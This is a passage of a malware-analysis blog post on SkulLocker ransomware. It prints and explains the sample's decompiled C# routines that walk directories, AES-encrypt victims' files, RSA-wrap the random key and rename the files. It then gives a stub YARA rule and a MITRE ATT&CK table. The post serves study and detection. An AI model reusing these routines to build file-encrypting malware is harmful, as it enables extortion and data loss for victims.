+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="n">Program</span><span class="p">.</span><span class="n">encryptDirectory</span><span class="p">(</span><span class="n">location</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The main idea of the function is to loop through the  <code>Desktop</code> directory and list all files and subdirectories.  the <code>getFiles</code> is responsible of retrieving the files in the <code>location</code>  using the class <code>Directory</code> which contains a bunch of things that is verified such as : fullpath, userPath, searOption</p>
+<p><code>string[] files = Directory.GetFiles(location);</code>
+after this it loop through files , the first thing that the malware checks/validate  the file extension .</p>
+<p><code>if (Array.Exists&lt;string&gt;(Program.validExtensions, (string E) =&gt; E == extension.ToLower()) &amp;&amp; fileName != Program.droppedMessageTextbox)</code></p>
+<p>if the file extension should not be the same as the malware which is indecated in the <code>droppedMessageTextbo</code>  which is basicaly the file that the malware write when the encryption is finished and contains the threat actors message
+<code>private static string droppedMessageTextbox = &quot;read_it.txt&quot;;</code></p>
+<p>the last part of this is about checking the size of the files is the file size is less than <code>2117152</code>  which is approximatly 2MB  <code>if (fileInfo.Length &lt; 2117152L)</code>
+it encrypt the file using <code>EncrypotFile</code> which we will see later in the post .
+the second if condition is about checking again the size of the file if it&rsquo;s bigger than 200000000bytes it generate a random a strng of the length between 200000000 and 300000000 bytes, than it encodes it using <code>randomEncode</code> method . after the encoding it writes it to the file using the <code>WriteAllText</code>  than appending a random 4 characters extension generated by the <code>RandomStringForExtension</code>  .
+.</p>
+<h4 id="file-encryption">file Encryption</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="n">analyse</span> <span class="k">this</span> <span class="p">:</span> 	<span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="n">EncryptFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="kt">byte</span><span class="p">[]</span> <span class="n">bytesToBeEncrypted</span> <span class="p">=</span> <span class="n">File</span><span class="p">.</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="kt">string</span> <span class="n">text</span> <span class="p">=</span> <span class="n">Program</span><span class="p">.</span><span class="n">CreatePassword</span><span class="p">(</span><span class="m">20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="kt">byte</span><span class="p">[]</span> <span class="n">bytes</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">text</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="kt">byte</span><span class="p">[]</span> <span class="n">inArray</span> <span class="p">=</span> <span class="n">Program</span><span class="p">.</span><span class="n">AES_Encrypt</span><span class="p">(</span><span class="n">bytesToBeEncrypted</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="n">File</span><span class="p">.</span><span class="n">WriteAllText</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="s">&#34;&lt;EncryptedKey&gt;&#34;</span> <span class="p">+</span> <span class="n">Program</span><span class="p">.</span><span class="n">RSAEncrypt</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">Program</span><span class="p">.</span><span class="n">rsaKey</span><span class="p">())</span> <span class="p">+</span> <span class="s">&#34;&lt;EncryptedKey&gt;&#34;</span> <span class="p">+</span> <span class="n">Convert</span><span class="p">.</span><span class="n">ToBase64String</span><span class="p">(</span><span class="n">inArray</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">			<span class="n">File</span><span class="p">.</span><span class="n">Move</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">file</span> <span class="p">+</span> <span class="s">&#34;.&#34;</span> <span class="p">+</span> <span class="n">Program</span><span class="p">.</span><span class="n">RandomStringForExtension</span><span class="p">(</span><span class="m">4</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>this function is the function that encrypt the files it takes file as an input and reads all the file  bytes <code>bytesToBeEncrypted</code> , than it creates a password of length 20 using the <code>CreatePassword</code> method _ we will cover it in other section _  , this password is converted to bytes array using UTF-8 encoding . the <code>bytesToBeEncrypted</code>  is using AES encryption algorithm and the bytes password using <code>AES_Encrypt</code>  method _ we will cover it in other secion _  . the last part is about moving files using <code>move</code> and appending new extension using  <code>RandomStringForExtension</code> with 4 character string  .</p>
+<h4 id="rsa-encryption">RSA encryption</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl">	<span class="c1">// Token: 0x06000010 RID: 16 RVA: 0x00002764 File Offset: 0x00000964</span>
+</span></span><span class="line"><span class="cl">		<span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">RSAEncrypt</span><span class="p">(</span><span class="kt">string</span> <span class="n">textToEncrypt</span><span class="p">,</span> <span class="kt">string</span> <span class="n">publicKeyString</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="kt">byte</span><span class="p">[]</span> <span class="n">bytes</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">textToEncrypt</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="kt">string</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="k">using</span> <span class="p">(</span><span class="n">RSACryptoServiceProvider</span> <span class="n">rsacryptoServiceProvider</span> <span class="p">=</span> <span class="k">new</span> <span class="n">RSACryptoServiceProvider</span><span class="p">(</span><span class="m">1024</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">try</span>
+</span></span><span class="line"><span class="cl">				<span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="n">rsacryptoServiceProvider</span><span class="p">.</span><span class="n">FromXmlString</span><span class="p">(</span><span class="n">publicKeyString</span><span class="p">.</span><span class="n">ToString</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">					<span class="kt">byte</span><span class="p">[]</span> <span class="n">inArray</span> <span class="p">=</span> <span class="n">rsacryptoServiceProvider</span><span class="p">.</span><span class="n">Encrypt</span><span class="p">(</span><span class="n">bytes</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">					<span class="kt">string</span> <span class="n">text</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">ToBase64String</span><span class="p">(</span><span class="n">inArray</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">					<span class="n">result</span> <span class="p">=</span> <span class="n">text</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">				<span class="k">finally</span>
+</span></span><span class="line"><span class="cl">				<span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="n">rsacryptoServiceProvider</span><span class="p">.</span><span class="n">PersistKeyInCsp</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>the rsaEncrypt method takes a <code>textToEncrypt</code>  and a <code>publicKeyString</code> as inputs .
+first it takes the <code>textToEncrypt</code> and convert it to byte array again using UTF-8 encodiing , and generate an RSA encryption object with a key size of 1024  using <code>rsaCryptoServiceProvider</code> . this encryption is used to encrypt the byte array and convert them into base64 encoding string .</p>
+<h4 id="aes-encryption">AES encryption</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl">	<span class="c1">// Token: 0x0600000E RID: 14 RVA: 0x000025F8 File Offset: 0x000007F8</span>
+</span></span><span class="line"><span class="cl">		<span class="k">public</span> <span class="k">static</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">AES_Encrypt</span><span class="p">(</span><span class="kt">byte</span><span class="p">[]</span> <span class="n">bytesToBeEncrypted</span><span class="p">,</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">passwordBytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="kt">byte</span><span class="p">[]</span> <span class="n">result</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="kt">byte</span><span class="p">[]</span> <span class="n">salt</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[]</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="m">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				<span class="m">2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				<span class="m">3</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				<span class="m">4</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				<span class="m">5</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				<span class="m">6</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				<span class="m">7</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				<span class="m">8</span>
+</span></span><span class="line"><span class="cl">			<span class="p">};</span>
+</span></span><span class="line"><span class="cl">			<span class="k">using</span> <span class="p">(</span><span class="n">MemoryStream</span> <span class="n">memoryStream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MemoryStream</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">using</span> <span class="p">(</span><span class="n">RijndaelManaged</span> <span class="n">rijndaelManaged</span> <span class="p">=</span> <span class="k">new</span> <span class="n">RijndaelManaged</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">				<span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="n">rijndaelManaged</span><span class="p">.</span><span class="n">KeySize</span> <span class="p">=</span> <span class="m">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">					<span class="n">rijndaelManaged</span><span class="p">.</span><span class="n">BlockSize</span> <span class="p">=</span> <span class="m">128</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">					<span class="n">Rfc2898DeriveBytes</span> <span class="n">rfc2898DeriveBytes</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Rfc2898DeriveBytes</span><span class="p">(</span><span class="n">passwordBytes</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="m">1000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">					<span class="n">rijndaelManaged</span><span class="p">.</span><span class="n">Key</span> <span class="p">=</span> <span class="n">rfc2898DeriveBytes</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">rijndaelManaged</span><span class="p">.</span><span class="n">KeySize</span> <span class="p">/</span> <span class="m">8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">					<span class="n">rijndaelManaged</span><span class="p">.</span><span class="n">IV</span> <span class="p">=</span> <span class="n">rfc2898DeriveBytes</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">rijndaelManaged</span><span class="p">.</span><span class="n">BlockSize</span> <span class="p">/</span> <span class="m">8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">					<span class="n">rijndaelManaged</span><span class="p">.</span><span class="n">Mode</span> <span class="p">=</span> <span class="n">CipherMode</span><span class="p">.</span><span class="n">CBC</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">					<span class="k">using</span> <span class="p">(</span><span class="n">CryptoStream</span> <span class="n">cryptoStream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">CryptoStream</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">,</span> <span class="n">rijndaelManaged</span><span class="p">.</span><span class="n">CreateEncryptor</span><span class="p">(),</span> <span class="n">CryptoStreamMode</span><span class="p">.</span><span class="n">Write</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">					<span class="p">{</span>
+</span></span><span class="line"><span class="cl">						<span class="n">cryptoStream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">bytesToBeEncrypted</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">bytesToBeEncrypted</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">						<span class="n">cryptoStream</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">					<span class="p">}</span>
+</span></span><span class="line"><span class="cl">					<span class="n">result</span> <span class="p">=</span> <span class="n">memoryStream</span><span class="p">.</span><span class="n">ToArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>the AES encrupt methode is the one responsible of encryption it takes the bytestobeencrypted and the passwordbytes we mentioned above.</p>
+<p>the methode seems to be like all the AES encryption implementation in any programing language , it initialize the sale in a fixed array also it initialize the MemoryStream onject to store the encrypted data , it initialize also the <code>RijndaeManaged</code> to configure the encryption settings .
+we can also see the usage of the <code>Rfc2898DeriveBytes</code>  object which will generate the key and IV  based on the PasswordBytes and the salt values . the 1000 at the end i guess its for iterations .
+at the end of the methode we see <code>CryptoStream </code> which is initailiazed to write the encrypted Data to <code>MemoRyStream</code>
+the data is encrypted using the RijndaelManaged object and the bytestoBeEncrypted is written to CryptoStream which will be converted to MemoryStream at the end .</p>
+<h4 id="password-used-in-the-encryption">Password used in the encryption</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl">		<span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">CreatePassword</span><span class="p">(</span><span class="kt">int</span> <span class="n">length</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="n">StringBuilder</span> <span class="n">stringBuilder</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">			<span class="n">Random</span> <span class="n">random</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Random</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">			<span class="k">while</span> <span class="p">(</span><span class="m">0</span> <span class="p">&lt;</span> <span class="n">length</span><span class="p">--)</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="n">stringBuilder</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="s">&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&amp;?&amp;/&#34;</span><span class="p">[</span><span class="n">random</span><span class="p">.</span><span class="n">Next</span><span class="p">(</span><span class="s">&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&amp;?&amp;/&#34;</span><span class="p">.</span><span class="n">Length</span><span class="p">)]);</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="n">stringBuilder</span><span class="p">.</span><span class="n">ToString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>thios function is reponsible of creating the password used in functions above to encrypt files , it take a length as inpuit , first it creates a <code>StringBuilder</code>  which is used to store the password and create a <code>random</code>  object to generate random integers, those steps are used to loop through the length within each loop iterations it appends a random character from the string containing all possible characters that can be used in the password .
+the end of the methode returns the final password .</p>
+<h2 id="detection">Detection</h2>
+<h3 id="yara">YARA</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">import</span> <span class="s">&#34;dotnet&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rule</span> <span class="n">Mal_SkulLocker_2023</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">    <span class="nl">meta</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">author</span>      <span class="o">=</span> <span class="s">&#34;the hacker news bdarija&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">description</span> <span class="o">=</span> <span class="s">&#34;SkullLocker Ransomware&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">created</span>     <span class="o">=</span> <span class="s">&#34;2023-03-009&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">strings</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">       <span class="cp">#TODO
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="nl">condition</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="cp"># TODO
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="mitre-attack">Mitre Attack</h3>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Tactic</th>
+<th>Technique</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>T1037.005</td>
+<td>Persistence, Privilege Escalation</td>
+<td>Boot or Logon Initialization Scripts</td>
+<td>Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items</td>
+</tr>
+<tr>
+<td>T1055</td>
+<td>Defense Evasion Privilege Escalation</td>
+<td>Process Injection</td>
+<td>Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process&rsquo;s memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.</td>
+</tr>
+<tr>
+<td>T1012</td>
+<td>Discovery</td>
+<td>RegKey execution</td>
+<td>Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.</td>
+</tr>
+<tr>
+<td>T1222</td>
+<td>Defense Evasion</td>
+<td>File And Directory Permission modificatioin</td>
+<td>Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.</td>
+</tr>
+<tr>
+<td>T1547.001</td>
+<td>Persistence, Privilege escalation</td>
+<td>Boot or logon autostart execution : registry run keys /startup folder</td>
+<td>Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the &ldquo;run keys&rdquo; in the Registry or startup folder will cause the program referenced to be executed when a user logs in</td>
+</tr>
+<tr>
+<td>T1070.004</td>
+<td>Defense Evasions</td>
+<td>Indicator Removel : File deletion</td>
+<td>Adversaries may delete files left behind by the actions of their intrusion activity.</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h1 id="references">References</h1>
+<p><a href="https://bazaar.abuse.ch/sample/bb5ca9d8de51734dbd14dc081c7c892d819cd14fafd7ccd62849d70f9e679369/" target="_blank" rel="noopener noreffer ">Malware Bazar</a>
+<a href="https://www.dgssi.gov.ma/fr/content/4061060323-skulllocker-ransomware.html" target="_blank" rel="noopener noreffer ">DGSSI</a></p>
+<h2 id="contributors">Contributors</h2>
+<ul>
+<li><a href="todo" rel="">0xpwny</a></li>
+<li><a href="https://twitter.com/c3p01337" target="_blank" rel="noopener noreffer ">c3p0d4y</a></li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-03-10</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://c3p0d4y.github.io/2023/03/skullocker/" data-title="SkulLocker" data-via="c3p0d4y" data-hashtags="Ransomware,Reversing,SkullLocker"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://c3p0d4y.github.io/2023/03/skullocker/" data-hashtag="Ransomware"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://c3p0d4y.github.io/2023/03/skullocker/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://c3p0d4y.github.io/2023/03/skullocker/" data-title="SkulLocker"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://c3p0d4y.github.io/2023/03/skullocker/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://c3p0d4y.github.io/2023/03/skullocker/" data-title="SkulLocker"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://c3p0d4y.github.io/2023/03/skullocker/" data-title="SkulLocker"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ransomware/">Ransomware</a>,&nbsp;<a href="/tags/reversing/">Reversing</a>,&nbsp;<a href="/tags/skulllocker/">SkullLocker</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://c3p0d4y.github.io" target="_blank">c3p0d4y</a></span>&nbsp;|&nbsp;<span class="license"><a rel="This is free and unencumbered software released into the public domain." href="https://unlicense.org" target="_blank">The Unlicense</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/twemoji@14.0.2/dist/twemoji.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"data":{"id-1":"c3p0d4y","id-2":"c3p0d4y"},"lightgallery":true,"search":{"algoliaAppID":"","algoliaIndex":"","algoliaSearchKey":"","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"},"twemoji":true,"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
